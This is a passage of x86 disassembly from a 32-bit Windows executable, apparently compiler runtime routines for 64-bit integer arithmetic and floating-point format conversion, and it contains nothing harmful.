  425141:	mov    eax,DWORD PTR [esp+0x14]
  425145:	or     eax,eax
  425147:	jne    0x425171
  425149:	mov    ecx,DWORD PTR [esp+0x10]
  42514d:	mov    eax,DWORD PTR [esp+0xc]
  425151:	xor    edx,edx
  425153:	div    ecx
  425155:	mov    ebx,eax
  425157:	mov    eax,DWORD PTR [esp+0x8]
  42515b:	div    ecx
  42515d:	mov    esi,eax
  42515f:	mov    eax,ebx
  425161:	mul    DWORD PTR [esp+0x10]
  425165:	mov    ecx,eax
  425167:	mov    eax,esi
  425169:	mul    DWORD PTR [esp+0x10]
  42516d:	add    edx,ecx
  42516f:	jmp    0x4251b8
  425171:	mov    ecx,eax
  425173:	mov    ebx,DWORD PTR [esp+0x10]
  425177:	mov    edx,DWORD PTR [esp+0xc]
  42517b:	mov    eax,DWORD PTR [esp+0x8]
  42517f:	shr    ecx,1
  425181:	rcr    ebx,1
  425183:	shr    edx,1
  425185:	rcr    eax,1
  425187:	or     ecx,ecx
  425189:	jne    0x42517f
  42518b:	div    ebx
  42518d:	mov    esi,eax
  42518f:	mul    DWORD PTR [esp+0x14]
  425193:	mov    ecx,eax
  425195:	mov    eax,DWORD PTR [esp+0x10]
  425199:	mul    esi
  42519b:	add    edx,ecx
  42519d:	jb     0x4251ad
  42519f:	cmp    edx,DWORD PTR [esp+0xc]
  4251a3:	ja     0x4251ad
  4251a5:	jb     0x4251b6
  4251a7:	cmp    eax,DWORD PTR [esp+0x8]
  4251ab:	jbe    0x4251b6
  4251ad:	dec    esi
  4251ae:	sub    eax,DWORD PTR [esp+0x10]
  4251b2:	sbb    edx,DWORD PTR [esp+0x14]
  4251b6:	xor    ebx,ebx
  4251b8:	sub    eax,DWORD PTR [esp+0x8]
  4251bc:	sbb    edx,DWORD PTR [esp+0xc]
  4251c0:	neg    edx
  4251c2:	neg    eax
  4251c4:	sbb    edx,0x0
  4251c7:	mov    ecx,edx
  4251c9:	mov    edx,ebx
  4251cb:	mov    ebx,ecx
  4251cd:	mov    ecx,eax
  4251cf:	mov    eax,esi
  4251d1:	pop    esi
  4251d2:	ret    0x10
  4251d5:	push   ebp
  4251d6:	mov    ebp,esp
  4251d8:	sub    esp,0x2c
  4251db:	mov    eax,ds:0x4314e0
  4251e0:	xor    eax,ebp
  4251e2:	mov    DWORD PTR [ebp-0x4],eax
  4251e5:	mov    eax,DWORD PTR [ebp+0x8]
  4251e8:	lea    ecx,[ebp-0x2c]
  4251eb:	push   ebx
  4251ec:	push   esi
  4251ed:	mov    esi,DWORD PTR [ebp+0xc]
  4251f0:	push   edi
  4251f1:	push   DWORD PTR [ebp+0x10]
  4251f4:	mov    DWORD PTR [ebp-0x14],eax
  4251f7:	mov    eax,DWORD PTR [ebp+0x14]
  4251fa:	mov    DWORD PTR [ebp-0x1c],eax
  4251fd:	call   0x4207b2
  425202:	lea    eax,[ebp-0x2c]
  425205:	xor    edi,edi
  425207:	push   eax
  425208:	push   edi
  425209:	push   edi
  42520a:	push   edi
  42520b:	push   edi
  42520c:	push   esi
  42520d:	lea    eax,[ebp-0x18]
  425210:	push   eax
  425211:	lea    eax,[ebp-0x10]
  425214:	push   eax
  425215:	call   0x425eb4
  42521a:	mov    ebx,eax
  42521c:	add    esp,0x20
  42521f:	mov    eax,DWORD PTR [ebp-0x1c]
  425222:	test   eax,eax
  425224:	je     0x42522b
  425226:	mov    ecx,DWORD PTR [ebp-0x18]
  425229:	mov    DWORD PTR [eax],ecx
  42522b:	push   DWORD PTR [ebp-0x14]
  42522e:	lea    eax,[ebp-0x10]
  425231:	push   eax
  425232:	call   0x425942
  425237:	pop    ecx
  425238:	pop    ecx
  425239:	test   bl,0x3
  42523c:	jne    0x42524c
  42523e:	cmp    eax,0x1
  425241:	je     0x425256
  425243:	cmp    eax,0x2
  425246:	jne    0x425259
  425248:	push   0x4
  42524a:	jmp    0x425258
  42524c:	test   bl,0x1
  42524f:	jne    0x425248
  425251:	test   bl,0x2
  425254:	je     0x425259
  425256:	push   0x3
  425258:	pop    edi
  425259:	cmp    BYTE PTR [ebp-0x20],0x0
  42525d:	je     0x425266
  42525f:	mov    ecx,DWORD PTR [ebp-0x24]
  425262:	and    DWORD PTR [ecx+0x70],0xfffffffd
  425266:	mov    ecx,DWORD PTR [ebp-0x4]
  425269:	mov    eax,edi
  42526b:	pop    edi
  42526c:	pop    esi
  42526d:	xor    ecx,ebp
  42526f:	pop    ebx
  425270:	call   0x421878
  425275:	mov    esp,ebp
  425277:	pop    ebp
  425278:	ret    
  425279:	push   ebp
  42527a:	mov    ebp,esp
  42527c:	sub    esp,0x28
  42527f:	mov    eax,ds:0x4314e0
  425284:	xor    eax,ebp
  425286:	mov    DWORD PTR [ebp-0x4],eax
  425289:	push   ebx
  42528a:	push   esi
  42528b:	mov    esi,DWORD PTR [ebp+0xc]
  42528e:	lea    ecx,[ebp-0x28]
  425291:	push   edi
  425292:	push   DWORD PTR [ebp+0x10]
  425295:	mov    edi,DWORD PTR [ebp+0x8]
  425298:	call   0x4207b2
  42529d:	lea    eax,[ebp-0x28]
  4252a0:	xor    ebx,ebx
  4252a2:	push   eax
  4252a3:	push   ebx
  4252a4:	push   ebx
  4252a5:	push   ebx
  4252a6:	push   ebx
  4252a7:	push   esi
  4252a8:	lea    eax,[ebp-0x18]
  4252ab:	push   eax
  4252ac:	lea    eax,[ebp-0x10]
  4252af:	push   eax
  4252b0:	call   0x425eb4
  4252b5:	mov    DWORD PTR [ebp-0x14],eax
  4252b8:	lea    eax,[ebp-0x10]
  4252bb:	push   edi
  4252bc:	push   eax
  4252bd:	call   0x4253d0
  4252c2:	mov    ecx,eax
  4252c4:	add    esp,0x28
  4252c7:	mov    eax,DWORD PTR [ebp-0x14]
  4252ca:	test   al,0x3
  4252cc:	jne    0x4252dc
  4252ce:	cmp    ecx,0x1
  4252d1:	je     0x4252e4
  4252d3:	cmp    ecx,0x2
  4252d6:	jne    0x4252e7
  4252d8:	push   0x4
  4252da:	jmp    0x4252e6
  4252dc:	test   al,0x1
  4252de:	jne    0x4252d8
  4252e0:	test   al,0x2
  4252e2:	je     0x4252e7
  4252e4:	push   0x3
  4252e6:	pop    ebx
  4252e7:	cmp    BYTE PTR [ebp-0x1c],0x0
  4252eb:	je     0x4252f4
  4252ed:	mov    ecx,DWORD PTR [ebp-0x20]
  4252f0:	and    DWORD PTR [ecx+0x70],0xfffffffd
  4252f4:	mov    ecx,DWORD PTR [ebp-0x4]
  4252f7:	mov    eax,ebx
  4252f9:	pop    edi
  4252fa:	pop    esi
  4252fb:	xor    ecx,ebp
  4252fd:	pop    ebx
  4252fe:	call   0x421878
  425303:	mov    esp,ebp
  425305:	pop    ebp
  425306:	ret    
  425307:	push   ebp
  425308:	mov    ebp,esp
  42530a:	push   0x0
  42530c:	push   DWORD PTR [ebp+0x10]
  42530f:	push   DWORD PTR [ebp+0xc]
  425312:	push   DWORD PTR [ebp+0x8]
  425315:	call   0x4251d5
  42531a:	add    esp,0x10
  42531d:	pop    ebp
  42531e:	ret    
  42531f:	int3   
  425320:	mov    eax,DWORD PTR [esp+0x8]
  425324:	mov    ecx,DWORD PTR [esp+0x10]
  425328:	or     ecx,eax
  42532a:	mov    ecx,DWORD PTR [esp+0xc]
  42532e:	jne    0x425339
  425330:	mov    eax,DWORD PTR [esp+0x4]
  425334:	mul    ecx
  425336:	ret    0x10
  425339:	push   ebx
  42533a:	mul    ecx
  42533c:	mov    ebx,eax
  42533e:	mov    eax,DWORD PTR [esp+0x8]
  425342:	mul    DWORD PTR [esp+0x14]
  425346:	add    ebx,eax
  425348:	mov    eax,DWORD PTR [esp+0x8]
  42534c:	mul    ecx
  42534e:	add    edx,ebx
  425350:	pop    ebx
  425351:	ret    0x10
  425354:	push   ebp
  425355:	mov    ebp,esp
  425357:	call   0x42536b
  42535c:	cmp    DWORD PTR [ebp+0x8],0x0
  425360:	je     0x425367
  425362:	call   0x4270fa
  425367:	fnclex 
  425369:	pop    ebp
  42536a:	ret    
  42536b:	mov    eax,0x42665c
  425370:	mov    DWORD PTR ds:0x43123c,0x426f48
  42537a:	mov    ds:0x431238,eax
  42537f:	mov    DWORD PTR ds:0x431240,0x426fd9
  425389:	mov    DWORD PTR ds:0x431244,0x427033
  425393:	mov    DWORD PTR ds:0x431248,0x4270b8
  42539d:	mov    ds:0x43124c,eax
  4253a2:	mov    DWORD PTR ds:0x431250,0x42667d
  4253ac:	mov    DWORD PTR ds:0x431254,0x426ff1
  4253b6:	mov    DWORD PTR ds:0x431258,0x426f59
  4253c0:	mov    DWORD PTR ds:0x43125c,0x427044
  4253ca:	ret    
  4253cb:	int3   
  4253cc:	int3   
  4253cd:	int3   
  4253ce:	int3   
  4253cf:	int3   
  4253d0:	push   ebp
  4253d1:	mov    ebp,esp
  4253d3:	sub    esp,0x44
  4253d6:	mov    eax,ds:0x4314e0
  4253db:	xor    eax,ebp
  4253dd:	mov    DWORD PTR [ebp-0x4],eax
  4253e0:	mov    ecx,DWORD PTR [ebp+0x8]
  4253e3:	push   ebx
  4253e4:	push   esi
  4253e5:	push   edi
  4253e6:	movzx  eax,WORD PTR [ecx+0xa]
  4253ea:	xor    ebx,ebx
  4253ec:	mov    edi,DWORD PTR [ebp+0xc]
  4253ef:	mov    edx,eax
  4253f1:	and    eax,0x8000
  4253f6:	mov    DWORD PTR [ebp-0x40],edi
  4253f9:	mov    DWORD PTR [ebp-0x44],eax
  4253fc:	and    edx,0x7fff
  425402:	mov    eax,DWORD PTR [ecx+0x6]
  425405:	sub    edx,0x3fff
  42540b:	mov    DWORD PTR [ebp-0x10],eax
  42540e:	mov    eax,DWORD PTR [ecx+0x2]
  425411:	mov    DWORD PTR [ebp-0xc],eax
  425414:	movzx  eax,WORD PTR [ecx]
  425417:	shl    eax,0x10
  42541a:	mov    DWORD PTR [ebp-0x20],edx
  42541d:	mov    DWORD PTR [ebp-0x8],eax
  425420:	cmp    edx,0xffffc001
  425426:	jne    0x42544d
  425428:	mov    esi,ebx
  42542a:	mov    eax,ebx
  42542c:	cmp    DWORD PTR [ebp+eax*4-0x10],ebx
  425430:	jne    0x42543d
  425432:	inc    eax
  425433:	cmp    eax,0x3
  425436:	jl     0x42542c
  425438:	jmp    0x4258f6
  42543d:	xor    eax,eax
  42543f:	lea    edi,[ebp-0x10]
  425442:	stos   DWORD PTR es:[edi],eax
  425443:	stos   DWORD PTR es:[edi],eax
  425444:	stos   DWORD PTR es:[edi],eax
  425445:	push   0x2
  425447:	pop    ebx
  425448:	jmp    0x4258f3
  42544d:	mov    eax,ds:0x4315c0
  425452:	lea    esi,[ebp-0x10]
  425455:	lea    edi,[ebp-0x1c]
  425458:	mov    DWORD PTR [ebp-0x24],edx
  42545b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42545c:	dec    eax
  42545d:	mov    DWORD PTR [ebp-0x34],eax
  425460:	push   0x1f
  425462:	mov    DWORD PTR [ebp-0x2c],ebx
  425465:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425466:	lea    ecx,[eax+0x1]
  425469:	mov    eax,ecx
  42546b:	cdq    
  42546c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42546d:	pop    esi
  42546e:	and    edx,esi
  425470:	add    edx,eax
  425472:	sar    edx,0x5
  425475:	mov    DWORD PTR [ebp-0x3c],edx
  425478:	and    ecx,0x8000001f
  42547e:	jns    0x425485
  425480:	dec    ecx
  425481:	or     ecx,0xffffffe0
  425484:	inc    ecx
  425485:	sub    esi,ecx
  425487:	xor    eax,eax
  425489:	inc    eax
  42548a:	mov    DWORD PTR [ebp-0x30],esi
  42548d:	mov    ecx,esi
  42548f:	or     edi,0xffffffff
  425492:	shl    eax,cl
  425494:	push   0x3
  425496:	pop    esi
  425497:	test   DWORD PTR [ebp+edx*4-0x10],eax
  42549b:	je     0x425545
  4254a1:	mov    eax,edi
  4254a3:	shl    eax,cl
  4254a5:	not    eax
  4254a7:	test   DWORD PTR [ebp+edx*4-0x10],eax
  4254ab:	jmp    0x4254b1
  4254ad:	cmp    DWORD PTR [ebp+edx*4-0x10],ebx
  4254b1:	jne    0x4254bd
  4254b3:	inc    edx
  4254b4:	cmp    edx,esi
  4254b6:	jl     0x4254ad
  4254b8:	jmp    0x425542
  4254bd:	mov    eax,DWORD PTR [ebp-0x34]
  4254c0:	cdq    
  4254c1:	push   0x1f
  4254c3:	pop    ecx
  4254c4:	and    edx,ecx
  4254c6:	add    edx,eax
  4254c8:	mov    eax,DWORD PTR [ebp-0x34]
  4254cb:	sar    edx,0x5
  4254ce:	and    eax,0x8000001f
  4254d3:	jns    0x4254da
  4254d5:	dec    eax
  4254d6:	or     eax,0xffffffe0
  4254d9:	inc    eax
  4254da:	sub    ecx,eax
  4254dc:	mov    DWORD PTR [ebp-0x2c],ebx
  4254df:	xor    eax,eax
  4254e1:	inc    eax
  4254e2:	shl    eax,cl
  4254e4:	mov    DWORD PTR [ebp-0x38],eax
  4254e7:	mov    eax,DWORD PTR [ebp+edx*4-0x10]
  4254eb:	mov    ecx,DWORD PTR [ebp-0x38]
  4254ee:	add    ecx,eax
  4254f0:	mov    DWORD PTR [ebp-0x28],ecx
  4254f3:	cmp    ecx,eax
  4254f5:	mov    eax,DWORD PTR [ebp-0x28]
  4254f8:	mov    ecx,ebx
  4254fa:	push   0xffffffff
  4254fc:	pop    edi
  4254fd:	jb     0x425504
  4254ff:	cmp    eax,DWORD PTR [ebp-0x38]
  425502:	jae    0x42550a
  425504:	xor    ecx,ecx
  425506:	inc    ecx
  425507:	mov    DWORD PTR [ebp-0x2c],ecx
  42550a:	mov    DWORD PTR [ebp+edx*4-0x10],eax
  42550e:	dec    edx
  42550f:	js     0x42553f
  425511:	test   ecx,ecx
  425513:	je     0x42553c
  425515:	mov    eax,DWORD PTR [ebp+edx*4-0x10]
  425519:	mov    ecx,ebx
  42551b:	mov    DWORD PTR [ebp-0x2c],ebx
  42551e:	lea    edi,[eax+0x1]
  425521:	cmp    edi,eax
  425523:	mov    DWORD PTR [ebp-0x28],edi
  425526:	mov    eax,edi
  425528:	jb     0x42552f
  42552a:	cmp    eax,0x1
  42552d:	jae    0x425535
  42552f:	xor    ecx,ecx
  425531:	inc    ecx
  425532:	mov    DWORD PTR [ebp-0x2c],ecx
  425535:	mov    DWORD PTR [ebp+edx*4-0x10],eax
  425539:	dec    edx
  42553a:	jns    0x425511
  42553c:	or     edi,0xffffffff
  42553f:	mov    ecx,DWORD PTR [ebp-0x30]
  425542:	mov    edx,DWORD PTR [ebp-0x3c]
  425545:	mov    eax,edi
  425547:	shl    eax,cl
  425549:	and    DWORD PTR [ebp+edx*4-0x10],eax
  42554d:	lea    eax,[edx+0x1]
  425550:	cmp    eax,esi
  425552:	jge    0x425565
  425554:	lea    edi,[ebp-0x10]
  425557:	mov    ecx,esi
  425559:	lea    edi,[edi+eax*4]
  42555c:	sub    ecx,eax
  42555e:	xor    eax,eax
  425560:	rep stos DWORD PTR es:[edi],eax
  425562:	or     edi,0xffffffff
  425565:	mov    ecx,DWORD PTR [ebp-0x20]
  425568:	cmp    DWORD PTR [ebp-0x2c],ebx
  42556b:	je     0x42556e
  42556d:	inc    ecx
  42556e:	mov    edx,DWORD PTR ds:0x4315bc
  425574:	mov    eax,edx
  425576:	sub    eax,DWORD PTR ds:0x4315c0
  42557c:	cmp    ecx,eax
  42557e:	jge    0x42558f
  425580:	xor    eax,eax
  425582:	lea    edi,[ebp-0x10]
  425585:	stos   DWORD PTR es:[edi],eax
  425586:	stos   DWORD PTR es:[edi],eax
  425587:	stos   DWORD PTR es:[edi],eax
  425588:	mov    esi,ebx
  42558a:	jmp    0x425445
  42558f:	cmp    ecx,edx
  425591:	jg     0x4257b0
  425597:	sub    edx,DWORD PTR [ebp-0x24]
  42559a:	lea    esi,[ebp-0x1c]
  42559d:	mov    DWORD PTR [ebp-0x30],edx
  4255a0:	lea    edi,[ebp-0x10]
  4255a3:	mov    eax,edx
  4255a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4255a6:	cdq    
  4255a7:	and    edx,0x1f
  4255aa:	add    eax,edx
  4255ac:	sar    eax,0x5
  4255af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4255b0:	mov    DWORD PTR [ebp-0x3c],eax
  4255b3:	mov    eax,DWORD PTR [ebp-0x30]
  4255b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4255b7:	and    eax,0x8000001f
  4255bc:	jns    0x4255c3
  4255be:	dec    eax
  4255bf:	or     eax,0xffffffe0
  4255c2:	inc    eax
  4255c3:	mov    DWORD PTR [ebp-0x30],eax
  4255c6:	or     edi,0xffffffff
  4255c9:	mov    eax,edi
  4255cb:	mov    DWORD PTR [ebp-0x20],ebx
  4255ce:	mov    edi,DWORD PTR [ebp-0x30]
  4255d1:	mov    ecx,edi
  4255d3:	shl    eax,cl
  4255d5:	not    eax
  4255d7:	push   0x20
  4255d9:	mov    DWORD PTR [ebp-0x28],eax
  4255dc:	pop    eax
  4255dd:	sub    eax,edi
  4255df:	push   0x3
  4255e1:	mov    DWORD PTR [ebp-0x38],eax
  4255e4:	pop    esi
  4255e5:	mov    edx,DWORD PTR [ebp+ebx*4-0x10]
  4255e9:	mov    ecx,edi
  4255eb:	mov    eax,edx
  4255ed:	shr    edx,cl
  4255ef:	or     edx,DWORD PTR [ebp-0x20]
  4255f2:	and    eax,DWORD PTR [ebp-0x28]
  4255f5:	mov    ecx,DWORD PTR [ebp-0x38]
  4255f8:	shl    eax,cl
  4255fa:	mov    DWORD PTR [ebp+ebx*4-0x10],edx
  4255fe:	inc    ebx
  4255ff:	mov    DWORD PTR [ebp-0x20],eax
  425602:	cmp    ebx,esi
  425604:	jl     0x4255e5
  425606:	mov    eax,DWORD PTR [ebp-0x3c]
  425609:	lea    edx,[ebp-0x8]
  42560c:	shl    eax,0x2
  42560f:	xor    ebx,ebx
  425611:	push   0x2
  425613:	sub    edx,eax
  425615:	or     edi,0xffffffff
  425618:	mov    eax,DWORD PTR [ebp-0x3c]
  42561b:	pop    ecx
  42561c:	cmp    ecx,eax
  42561e:	jl     0x42562b
  425620:	mov    eax,DWORD PTR [edx]
  425622:	mov    DWORD PTR [ebp+ecx*4-0x10],eax
  425626:	mov    eax,DWORD PTR [ebp-0x3c]
  425629:	jmp    0x42562f
  42562b:	mov    DWORD PTR [ebp+ecx*4-0x10],ebx
  42562f:	sub    edx,0x4
  425632:	dec    ecx
  425633:	jns    0x42561c
  425635:	mov    ecx,DWORD PTR [ebp-0x34]
  425638:	inc    ecx
  425639:	mov    eax,ecx
  42563b:	cdq    
  42563c:	and    edx,0x1f
  42563f:	add    edx,eax
  425641:	sar    edx,0x5
  425644:	mov    DWORD PTR [ebp-0x2c],edx
  425647:	and    ecx,0x8000001f
  42564d:	jns    0x425654
  42564f:	dec    ecx
  425650:	or     ecx,0xffffffe0
  425653:	inc    ecx
  425654:	push   0x1f
  425656:	pop    eax
  425657:	sub    eax,ecx
  425659:	mov    DWORD PTR [ebp-0x30],eax
  42565c:	xor    eax,eax
  42565e:	mov    ecx,DWORD PTR [ebp-0x30]
  425661:	inc    eax
  425662:	shl    eax,cl
  425664:	test   DWORD PTR [ebp+edx*4-0x10],eax
  425668:	je     0x425700
  42566e:	mov    eax,edi
  425670:	shl    eax,cl
  425672:	not    eax
  425674:	test   DWORD PTR [ebp+edx*4-0x10],eax
  425678:	jmp    0x42567e
  42567a:	cmp    DWORD PTR [ebp+edx*4-0x10],ebx
  42567e:	jne    0x425687
  425680:	inc    edx
  425681:	cmp    edx,esi
  425683:	jl     0x42567a
  425685:	jmp    0x4256fd
  425687:	mov    edi,DWORD PTR [ebp-0x34]
  42568a:	mov    eax,edi
  42568c:	push   0x1f
  42568e:	cdq    
  42568f:	pop    ecx
  425690:	and    edx,ecx
  425692:	add    edx,eax
  425694:	sar    edx,0x5
  425697:	and    edi,0x8000001f
  42569d:	jns    0x4256a4
  42569f:	dec    edi
  4256a0:	or     edi,0xffffffe0
  4256a3:	inc    edi
  4256a4:	mov    eax,DWORD PTR [ebp+edx*4-0x10]
  4256a8:	sub    ecx,edi
  4256aa:	xor    edi,edi
  4256ac:	inc    edi
  4256ad:	shl    edi,cl
  4256af:	mov    ecx,ebx
  4256b1:	mov    DWORD PTR [ebp-0x24],edi
  4256b4:	add    edi,eax
  4256b6:	mov    DWORD PTR [ebp-0x20],edi
  4256b9:	cmp    edi,eax
  4256bb:	mov    eax,DWORD PTR [ebp-0x20]
  4256be:	push   0xffffffff
  4256c0:	pop    edi
  4256c1:	jb     0x4256c8
  4256c3:	cmp    eax,DWORD PTR [ebp-0x24]
  4256c6:	jae    0x4256cb
  4256c8:	xor    ecx,ecx
  4256ca:	inc    ecx
  4256cb:	mov    DWORD PTR [ebp+edx*4-0x10],eax
  4256cf:	dec    edx
  4256d0:	js     0x4256fa
  4256d2:	test   ecx,ecx
  4256d4:	je     0x4256f7
  4256d6:	mov    eax,DWORD PTR [ebp+edx*4-0x10]
  4256da:	mov    ecx,ebx
  4256dc:	lea    edi,[eax+0x1]
  4256df:	cmp    edi,eax
  4256e1:	mov    DWORD PTR [ebp-0x20],edi
  4256e4:	mov    eax,edi
  4256e6:	jb     0x4256ed
  4256e8:	cmp    eax,0x1
  4256eb:	jae    0x4256f0
  4256ed:	xor    ecx,ecx
  4256ef:	inc    ecx
  4256f0:	mov    DWORD PTR [ebp+edx*4-0x10],eax
  4256f4:	dec    edx
  4256f5:	jns    0x4256d2
  4256f7:	or     edi,0xffffffff
  4256fa:	mov    ecx,DWORD PTR [ebp-0x30]
  4256fd:	mov    edx,DWORD PTR [ebp-0x2c]
  425700:	mov    eax,edi
  425702:	shl    eax,cl
  425704:	and    DWORD PTR [ebp+edx*4-0x10],eax
  425708:	inc    edx
  425709:	cmp    edx,esi
  42570b:	jge    0x42571e
  42570d:	lea    edi,[ebp-0x10]
  425710:	mov    ecx,esi
  425712:	lea    edi,[edi+edx*4]
  425715:	sub    ecx,edx
  425717:	xor    eax,eax
  425719:	rep stos DWORD PTR es:[edi],eax
  42571b:	or     edi,0xffffffff
  42571e:	mov    ecx,DWORD PTR ds:0x4315c4
  425724:	inc    ecx
  425725:	mov    eax,ecx
  425727:	cdq    
  425728:	and    edx,0x1f
  42572b:	add    eax,edx
  42572d:	sar    eax,0x5
  425730:	mov    DWORD PTR [ebp-0x28],eax
  425733:	and    ecx,0x8000001f
  425739:	jns    0x425740
  42573b:	dec    ecx
  42573c:	or     ecx,0xffffffe0
  42573f:	inc    ecx
  425740:	mov    DWORD PTR [ebp-0x24],ecx
  425743:	mov    eax,ebx
  425745:	shl    edi,cl
  425747:	push   0x20
  425749:	mov    DWORD PTR [ebp-0x20],ebx
  42574c:	not    edi
  42574e:	mov    ebx,DWORD PTR [ebp-0x24]
  425751:	pop    ecx
  425752:	sub    ecx,ebx
  425754:	mov    DWORD PTR [ebp-0x34],eax
  425757:	mov    DWORD PTR [ebp-0x24],ecx
  42575a:	mov    edx,DWORD PTR [ebp+eax*4-0x10]
  42575e:	mov    ecx,ebx
  425760:	mov    eax,edx
  425762:	shr    edx,cl
  425764:	mov    ecx,DWORD PTR [ebp-0x34]
  425767:	and    eax,edi
  425769:	or     edx,DWORD PTR [ebp-0x20]
  42576c:	mov    DWORD PTR [ebp+ecx*4-0x10],edx
  425770:	mov    ecx,DWORD PTR [ebp-0x24]
  425773:	shl    eax,cl
  425775:	mov    DWORD PTR [ebp-0x20],eax
  425778:	mov    eax,DWORD PTR [ebp-0x34]
  42577b:	inc    eax
  42577c:	mov    DWORD PTR [ebp-0x34],eax
  42577f:	cmp    eax,esi
  425781:	jl     0x42575a
  425783:	mov    esi,DWORD PTR [ebp-0x28]
  425786:	lea    edx,[ebp-0x8]
  425789:	mov    eax,esi
  42578b:	shl    eax,0x2
  42578e:	push   0x2
  425790:	sub    edx,eax
  425792:	xor    ebx,ebx
  425794:	pop    ecx
  425795:	cmp    ecx,esi
  425797:	jl     0x4257a1
  425799:	mov    eax,DWORD PTR [edx]
  42579b:	mov    DWORD PTR [ebp+ecx*4-0x10],eax
  42579f:	jmp    0x4257a5
  4257a1:	mov    DWORD PTR [ebp+ecx*4-0x10],ebx
  4257a5:	sub    edx,0x4
  4257a8:	dec    ecx
  4257a9:	jns    0x425795
  4257ab:	jmp    0x425588
  4257b0:	cmp    ecx,DWORD PTR ds:0x4315b8
  4257b6:	jl     0x42585e
  4257bc:	mov    ecx,DWORD PTR ds:0x4315c4
  4257c2:	lea    edi,[ebp-0x10]
  4257c5:	xor    eax,eax
  4257c7:	stos   DWORD PTR es:[edi],eax
  4257c8:	stos   DWORD PTR es:[edi],eax
  4257c9:	stos   DWORD PTR es:[edi],eax
  4257ca:	mov    eax,ecx
  4257cc:	or     DWORD PTR [ebp-0x10],0x80000000
  4257d3:	cdq    
  4257d4:	and    edx,0x1f
  4257d7:	add    eax,edx
  4257d9:	sar    eax,0x5
  4257dc:	mov    DWORD PTR [ebp-0x34],eax
  4257df:	and    ecx,0x8000001f
  4257e5:	jns    0x4257ec
  4257e7:	dec    ecx
  4257e8:	or     ecx,0xffffffe0
  4257eb:	inc    ecx
  4257ec:	or     edi,0xffffffff
  4257ef:	mov    DWORD PTR [ebp-0x38],ecx
  4257f2:	push   0x20
  4257f4:	shl    edi,cl
  4257f6:	pop    eax
  4257f7:	sub    eax,ecx
  4257f9:	mov    DWORD PTR [ebp-0x20],ebx
  4257fc:	not    edi
  4257fe:	mov    DWORD PTR [ebp-0x28],eax
  425801:	mov    edx,DWORD PTR [ebp+ebx*4-0x10]
  425805:	mov    eax,edx
  425807:	shr    edx,cl
  425809:	and    eax,edi
  42580b:	or     edx,DWORD PTR [ebp-0x20]
  42580e:	mov    ecx,DWORD PTR [ebp-0x28]
  425811:	shl    eax,cl
  425813:	mov    ecx,DWORD PTR [ebp-0x38]
  425816:	mov    DWORD PTR [ebp+ebx*4-0x10],edx
  42581a:	inc    ebx
  42581b:	mov    DWORD PTR [ebp-0x20],eax
  42581e:	cmp    ebx,esi
  425820:	jl     0x425801
  425822:	mov    esi,DWORD PTR [ebp-0x34]
  425825:	lea    edx,[ebp-0x8]
  425828:	mov    eax,esi
  42582a:	shl    eax,0x2
  42582d:	push   0x2
  42582f:	sub    edx,eax
  425831:	xor    ebx,ebx
  425833:	pop    ecx
  425834:	cmp    ecx,esi
  425836:	jl     0x425840
  425838:	mov    eax,DWORD PTR [edx]
  42583a:	mov    DWORD PTR [ebp+ecx*4-0x10],eax
  42583e:	jmp    0x425844
  425840:	mov    DWORD PTR [ebp+ecx*4-0x10],ebx
  425844:	sub    edx,0x4
  425847:	dec    ecx
  425848:	jns    0x425834
  42584a:	mov    esi,DWORD PTR ds:0x4315cc
  425850:	xor    ebx,ebx
  425852:	add    esi,DWORD PTR ds:0x4315b8
  425858:	inc    ebx
  425859:	jmp    0x4258f3
  42585e:	mov    esi,DWORD PTR ds:0x4315cc
  425864:	and    DWORD PTR [ebp-0x10],0x7fffffff
  42586b:	add    esi,ecx
  42586d:	mov    ecx,DWORD PTR ds:0x4315c4
  425873:	mov    eax,ecx
  425875:	cdq    
  425876:	and    edx,0x1f
  425879:	mov    DWORD PTR [ebp-0x38],esi
  42587c:	add    eax,edx
  42587e:	sar    eax,0x5
  425881:	mov    DWORD PTR [ebp-0x28],eax
  425884:	and    ecx,0x8000001f
  42588a:	jns    0x425891
  42588c:	dec    ecx
  42588d:	or     ecx,0xffffffe0
  425890:	inc    ecx
  425891:	push   0x20
  425893:	mov    DWORD PTR [ebp-0x20],ebx
  425896:	mov    esi,ebx
  425898:	shl    edi,cl
  42589a:	mov    ebx,ecx
  42589c:	pop    eax
  42589d:	sub    eax,ebx
  42589f:	mov    DWORD PTR [ebp-0x24],ecx
  4258a2:	not    edi
  4258a4:	mov    DWORD PTR [ebp-0x24],eax
  4258a7:	mov    edx,DWORD PTR [ebp+esi*4-0x10]
  4258ab:	mov    ecx,ebx
  4258ad:	mov    eax,edx
  4258af:	shr    edx,cl
  4258b1:	or     edx,DWORD PTR [ebp-0x20]
  4258b4:	and    eax,edi
  4258b6:	mov    ecx,DWORD PTR [ebp-0x24]
  4258b9:	shl    eax,cl
  4258bb:	mov    DWORD PTR [ebp+esi*4-0x10],edx
  4258bf:	inc    esi
  4258c0:	mov    DWORD PTR [ebp-0x20],eax
  4258c3:	cmp    esi,0x3
  4258c6:	jl     0x4258a7
  4258c8:	mov    edi,DWORD PTR [ebp-0x28]
  4258cb:	lea    edx,[ebp-0x8]
  4258ce:	mov    esi,DWORD PTR [ebp-0x38]
  4258d1:	mov    eax,edi
  4258d3:	shl    eax,0x2
  4258d6:	push   0x2
  4258d8:	sub    edx,eax
  4258da:	xor    ebx,ebx
  4258dc:	pop    ecx
  4258dd:	cmp    ecx,edi
  4258df:	jl     0x4258e9
  4258e1:	mov    eax,DWORD PTR [edx]
  4258e3:	mov    DWORD PTR [ebp+ecx*4-0x10],eax
  4258e7:	jmp    0x4258ed
  4258e9:	mov    DWORD PTR [ebp+ecx*4-0x10],ebx
  4258ed:	sub    edx,0x4
  4258f0:	dec    ecx
  4258f1:	jns    0x4258dd
  4258f3:	mov    edi,DWORD PTR [ebp-0x40]
  4258f6:	push   0x1f
  4258f8:	pop    eax
  4258f9:	sub    eax,DWORD PTR ds:0x4315c4
  4258ff:	mov    ecx,eax
  425901:	mov    eax,DWORD PTR [ebp-0x44]
  425904:	shl    esi,cl
  425906:	neg    eax
  425908:	sbb    eax,eax
  42590a:	and    eax,0x80000000
  42590f:	or     esi,eax
  425911:	mov    eax,ds:0x4315c8
  425916:	or     esi,DWORD PTR [ebp-0x10]
  425919:	cmp    eax,0x40
